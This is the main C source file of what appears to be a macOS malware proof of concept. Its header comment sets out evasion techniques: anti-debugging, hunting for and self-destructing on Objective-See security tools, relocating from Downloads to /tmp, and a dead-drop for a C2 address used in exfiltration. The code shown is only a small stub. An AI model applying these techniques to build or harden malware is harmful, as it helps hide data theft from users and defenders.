/*
 * + Author: 0x00s
 * + Notes:
 * - macOS Gatekeeper may flag it based on static heuristics, 
 * - XProtect consistently fails to detect it due to runtime mutation.
 * - Originally developed from internal research and shared publicly to demonstrate core techniques.
 *   – Fully extensible for new techniques.
 *     This is meant to be a research sample, not a production release.
 *     For now, you can test the mutation and execution with the simple function below,
 *     run `./testme.sh` for more verbose output. 
 *
 * + Execution Flow:
 *   - An anti-debug check is performed first, using simple symbol obfuscation.
 *   - Paths to Objective-See tools (e.g., LuLu) are decrypted in memory and checked for presence on the host.
 *     If detected, the binary is corrupted and self-destructs.
 *   - Then, the binary checks its initial execution location:
 *     - If running from ~/Downloads, it copies itself to /tmp and re-executes.
 *     - If all good, it proceeds with its main routine.
 *
 * + Note:
 *   - Execution follows a simple call sequence.
 *   - OvernOut() requires a few tweaks in logic order to proceed with the dead-drop
 *     and extract the C2 address and public key for exfiltration. ;)
 *   - It's there for a reason, you’ll see it. I’m not handing out malware for free. ;)
 *   - The auth() function requires a valid key in the vault, either decrypted at runtime
 *     or embedded directly.
 *   - A correct key is essential for successful execution.
 *
 * + Purpose:
 * Proof-of-Concept (PoC) for demonstrating custom malware development techniques on macOS.
 */

#include <wisp.h>

void run() {
    if (scan()) panic();
}

int main(void) {
    #ifndef TEST
    initialize__strings();
    #endif
    initialize();
    return 0;
}
